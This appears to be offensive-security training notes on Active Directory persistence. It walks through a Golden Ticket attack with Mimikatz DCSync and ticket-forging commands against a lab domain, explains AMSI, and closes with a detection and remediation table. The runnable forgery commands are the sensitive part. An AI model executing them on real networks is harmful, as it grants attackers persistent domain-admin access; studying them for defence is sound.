# 👑 Active Directory Persistence: Golden Ticket Attack & AMSI 

## 🎯 1. Persistence & Data Exfiltration Overview 

Once an adversary obtains high-privilege access across domain assets, the operational objectives shift toward **Persistence** to maintain access across credential resets or administrative cleanups, followed by **Collection & Exfiltration**.

### Common Exfiltration Vectors
* **T1020 - Automated Exfiltration:** Utilizing internal scheduled tasks or scripts to continuously gather and stage target data.
* **T1048 - Exfiltration Over Alternative Protocol:** Tunneling sensitive data over non-standard or covert channels (DNS tunneling, ICMP payloads, SSH over alternative egress ports).
* **T1052 - Exfiltration Over Physical Medium:** Copying staged archives to offline removable media.
* **T1537 - Transfer Data to Cloud Account:** Uploading staging archives directly to external cloud storage buckets (e.g., AWS S3, Azure Blob, Google Drive) using legitimate API calls.

---

## 🎟️ 2. Golden Ticket Concept & Mechanics [T1558.001]

### What is a Golden Ticket?
A **Golden Ticket** is a completely forged **Ticket Granting Ticket (TGT)**. In Active Directory, the Key Distribution Center (KDC) runs on the Domain Controller and relies on a special hidden service account called **`krbtgt`**.

* When any user requests authentication, the KDC signs and encrypts the issued TGT using the `krbtgt` account's secret key (NTLM hash or AES key).
* Because the KDC only inspects the cryptographic signature and does not track active state for every issued TGT, **an attacker possessing the `krbtgt` hash can create a mathematically valid TGT offline for any user, with any group memberships, and for arbitrary lifespans (e.g., 10 years).**

---

## 🔄 3. Golden Ticket Attack Flow

```text
+---------------------------------------------------------------------------------------------------+
|                                     GOLDEN TICKET ATTACK FLOW                                     |
+---------------------------------------------------------------------------------------------------+

   [ Attacker (Foothold) ]                                             [ Domain Controller / KDC ]
              |                                                                     |
              | 1. DCSync Attack (Replication Protocol)                            |
              |-------------------------------------------------------------------->|
              |                                                                     |
              | 2. Replicates and returns KRBTGT Account NTLM / AES Key             |
              |<--------------------------------------------------------------------|
              |
              | 3. Local Forgery (Mimikatz kerberos::golden):
              |    - Creates forged TGT for Administrator (RID 500)
              |    - Appends Group RID 512 (Domain Admins), Enterprise Admins
              |    - Sets expiration to 10 years
              |    - Encrypts & signs using KRBTGT key
              |    - Injects into memory cache (/ptt)
              |
              | 4. Requests TGS for any service (e.g., CIFS/DC-01) presenting forged TGT
              |-------------------------------------------------------------------->|
              |                                                                     |
              | 5. KDC decrypts TGT with KRBTGT key, verifies signature,            |
              |    and returns a valid TGS without questioning user validity        |
              |<--------------------------------------------------------------------|
              |
              | 6. Authenticates to target service with full administrative rights  |
              v

```

---

## 🛠️ 4. Practical Step-by-Step Implementation

### Step 1: Extract the `krbtgt` Account Hash

*Requires Domain Admin privileges or replication rights (`DS-Replication-Get-Changes-All`).*

```powershell
# Perform DCSync to extract the krbtgt hash over RPC
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:cyberwarfare.corp /user:cyberwarfare\krbtgt"'

```

*Note the resulting NTLM hash or AES-256 key from the output.*

---

### Step 2: Retrieve the Domain SID

Obtain the target domain's base Security Identifier (SID):

```powershell
# Approach A: Built-in Command Line
whoami /all

# Approach B: Using PowerView
. .\PowerView_dev.ps1
Get-DomainSID -Verbose

```

*(Example Domain SID: `S-1-5-21-3829562763-128392182-3849182390`).*

---

### Step 3: Forge and Inject the Golden Ticket (`/ptt`)

Generate the forged TGT and inject it directly into the current PowerShell session memory:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-3829562763-128392182-3849182390 /krbtgt:<KRBTGT_NTLM_HASH> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

```

### Parameter Breakdown

* **/user:** Target account identity to impersonate (e.g., `Administrator` or a non-existent decoy user).
* **/domain:** Fully Qualified Domain Name (`cyberwarfare.corp`).
* **/sid:** Domain Security Identifier (without the trailing user RID).
* **/krbtgt:** The harvested NTLM hash or AES key of the `krbtgt` account.
* **/id:** User RID to assign to the ticket (`500` = default Administrator).
* **/groups:** Security group RIDs to embed in the ticket (`512` = Domain Admins).
* **/startoffset:** Ticket validity start time offset in minutes (`0` = current time).
* **/endin:** Initial ticket lifespan in minutes (`600` = 10 hours).
* **/renewmax:** Maximum renewal lifetime (`10080` minutes = 7 days, or customized for longer persistence).
* **/ptt:** Pass-the-Ticket flag to inject the ticket directly into the current logon session.

---

### Step 4: Verification & Access Execution

```powershell
# 1. Verify that the forged TGT is active in memory
klist

# 2. Access the Domain Controller's file system directly
dir \\DC-01.cyberwarfare.corp\C$

```

---

## 🛡️ 5. What is AMSI (Antimalware Scan Interface)?

### Concept & Clarification

**AMSI (Antimalware Scan Interface)** is an interface standard integrated into modern Windows operating systems (Windows 10, Windows Server 2016, and newer).

*(Correction: It is not a feature of MS-DOS; it is a security interface designed for modern Windows application runtimes and script hosts).*

### How AMSI Operates

Prior to AMSI, adversaries bypassed signature detection by obfuscating scripts (e.g., Base64 encoding, variable concatenation) because antivirus software only inspected files written to disk.

AMSI solves this by integrating directly inside the runtime environment:

1. **Script Invocation:** When a script executes inside a supported host (such as `powershell.exe`, Windows Script Host `wscript.exe`/`cscript.exe`, or Office VBA macros).
2. **De-obfuscation Buffer:** The script engine decrypts and de-obfuscates the code in memory just prior to execution.
3. **Buffer Hand-off:** Before running the code, the engine calls `AmsiScanBuffer()` or `AmsiScanString()` inside `amsi.dll`.
4. **Antivirus Evaluation:** The payload buffer is passed to the installed security provider (e.g., Microsoft Defender or third-party EDR) for signature and heuristic evaluation.
5. **Enforcement:** If malicious content is flagged, the runtime blocks execution with an error: `"This script contains malicious content and has been blocked by your antivirus software."`

---

## 🛡️ 6. Defensive Remediation & Detection

| Technique | Remediation / Detection Strategy |
| --- | --- |
| **`krbtgt` Password Reset** | To invalidate forged Golden Tickets, the `krbtgt` account password **must be rotated twice** (with a 10-to-24 hour delay between resets to allow replication and avoid breaking active Kerberos tickets). |
| **DCSync Auditing** | Monitor **Security Event ID 4662** (An operation was performed on an object) for directory replication access rights (`DS-Replication-Get-Changes-All`) initiated by non-Domain Controller accounts. |
| **Abnormal Ticket Lifetimes** | Monitor Kerberos request events (**Event ID 4769**) where ticket duration or renewal limits deviate significantly from Domain Kerberos Policy defaults (default maximum ticket life is 10 hours). |
| **AMSI Tampering Monitoring** | Audit memory manipulation of `amsi.dll` and track PowerShell Event ID `4104` for script fragments attempting to patch `AmsiScanBuffer` memory addresses. |

